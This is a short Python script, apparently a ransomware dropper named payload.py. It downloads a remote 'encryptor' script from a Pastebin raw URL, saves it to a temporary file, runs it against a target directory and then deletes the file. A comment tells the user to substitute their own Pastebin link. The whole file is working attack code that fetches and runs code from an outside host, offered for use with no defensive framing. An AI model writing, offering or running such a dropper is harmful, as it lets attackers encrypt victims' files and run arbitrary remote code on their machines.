import os
import sys
import subprocess
import urllib.request
import tempfile

# ⚠️ REPLACE THIS WITH YOUR ACTUAL PASTEBIN RAW URL
ENCRYPTOR_URL = "https://pastebin.com/raw/ehxR39af"

def download_and_run_encryptor(target_dir):
    try:
        # Download the encryptor script
        with urllib.request.urlopen(ENCRYPTOR_URL) as response:
            script_code = response.read().decode('utf-8')

        # Save to a temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script_code)
            script_path = f.name

        # Run the script with the target directory
        result = subprocess.run(
            [sys.executable, script_path, target_dir],
            capture_output=True, text=True
        )
        print("STDOUT:", result.stdout)
        print("STDERR:", result.stderr)

        # Clean up
        os.unlink(script_path)
        return result.returncode == 0
    except Exception as e:
        print("Error in payload:", e)
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python payload.py <target_directory>")
        sys.exit(1)
    success = download_and_run_encryptor(sys.argv[1])
    sys.exit(0 if success else 1)